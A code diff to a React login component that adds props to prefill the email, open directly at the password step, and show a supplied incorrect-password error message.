@@ -7,6 +7,9 @@ interface OthersLoginPageProps {
   onLoginError?: (error: string) => void;
   onEmailSubmit?: (email: string) => boolean | Promise<boolean>;
   onBack?: () => void;
+  defaultEmail?: string;
+  startAtPasswordStep?: boolean;
+  incorrectPasswordError?: string;
 }
 
 const bgImages = [
@@ -24,10 +27,13 @@ const OthersLoginPage: React.FC<OthersLoginPageProps> = ({
   onLoginError,
   onEmailSubmit,
   onBack,
+  defaultEmail,
+  startAtPasswordStep,
+  incorrectPasswordError,
 }) => {
-  const [email, setEmail] = useState('');
+  const [email, setEmail] = useState(defaultEmail || '');
   const [password, setPassword] = useState('');
-  const [showPasswordStep, setShowPasswordStep] = useState(false);
+  const [showPasswordStep, setShowPasswordStep] = useState(!!startAtPasswordStep);
   const [pageReady, setPageReady] = useState(false);
   const [nextLoading, setNextLoading] = useState(false);
   const [submitting, setSubmitting] = useState(false);
@@ -190,7 +196,7 @@ const OthersLoginPage: React.FC<OthersLoginPageProps> = ({
           )}
 
           {/* Error Message */}
-          {errorMessage && !isLoading && (
+          {(errorMessage || incorrectPasswordError) && !isLoading && (
             <div
               style={{
                 margin: '0 0 16px',
@@ -202,7 +208,7 @@ const OthersLoginPage: React.FC<OthersLoginPageProps> = ({
                 border: '1px solid #ffc0c0',
               }}
             >
-              {errorMessage}
+              {errorMessage || incorrectPasswordError}
             </div>
           )}
 
